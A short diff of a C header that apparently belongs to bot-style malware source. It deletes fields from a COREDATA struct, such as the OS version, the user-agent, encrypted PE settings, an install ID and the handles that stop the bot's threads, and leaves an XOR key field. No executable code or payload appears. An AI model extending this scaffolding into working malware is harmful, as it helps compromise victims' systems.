@@ -110,17 +110,8 @@ typedef struct
     /*on_start*/WCHAR home[MAX_PATH]; //The home directory.
   }paths;
 
-  /*on_all*/DWORD winVersion;           //Windows version.
-  /*on_all*/BOOL is64bitOS;             //Is OS 64bit.
   /*on_all*/BYTE integrityLevel;        //The application level.
   /*on_all*/DWORD pid;                  //process ID.
-  /*on_all*/LPSTR httpUserAgent;        //HTTP user-agent, prior to accessing the variable,
-										//call Core::initHttpUserAgent();
-  /*on_start*/GUID osGuid;              //OS guid.
-  /*on_start*/PESETTINGS peSettings;    //These data are stored encryption, you can get them through
-                                        //Core::getPeSettings(). WARNING! Core::init() not called 
-										//by itself.
-  /*on_start*/WCHAR installId[40];      //installer ID to install as an upgrade.
   
   //Basic configuration.
   struct
@@ -128,13 +119,6 @@ typedef struct
     /*on_start*/DWORD xorKey;   //XOR key (size greater than or equal size).
   }baseConfigInfo;
 
-  //global objects.
-  struct
-  {
-    /*on_copy*/HANDLE stopEvent;        //Signal to stop global threads of bot.
-    /*on_copy*/HANDLE stopedEvent;      //Signal to stop global threads of the bot. While true 
-										//only for wow64.
-  }globalHandles;
 }COREDATA;
 extern COREDATA coreData;
 
